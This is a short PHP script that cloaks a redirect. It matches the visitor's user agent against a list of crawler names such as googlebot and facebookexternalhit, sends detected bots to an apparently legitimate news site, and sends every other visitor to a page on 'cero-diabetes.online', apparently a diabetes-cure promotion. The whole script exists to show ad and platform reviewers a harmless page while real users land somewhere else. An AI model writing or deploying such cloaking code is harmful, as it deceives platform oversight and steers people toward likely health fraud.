<?php 

function detectSpy(): bool{
  return (isset($_SERVER['HTTP_USER_AGENT']) && 
  preg_match('/bot|crawl|slurp|spider|mediapartners|facebookexternalhit|facebookcatalog|facebot|googlebot/i', $_SERVER['HTTP_USER_AGENT']));
}

if(detectSpy() === true ){
  header("Location: https://www.davila.cl/");
  exit;
}
  header("Location: https://cero-diabetes.online/host.html");
  return;


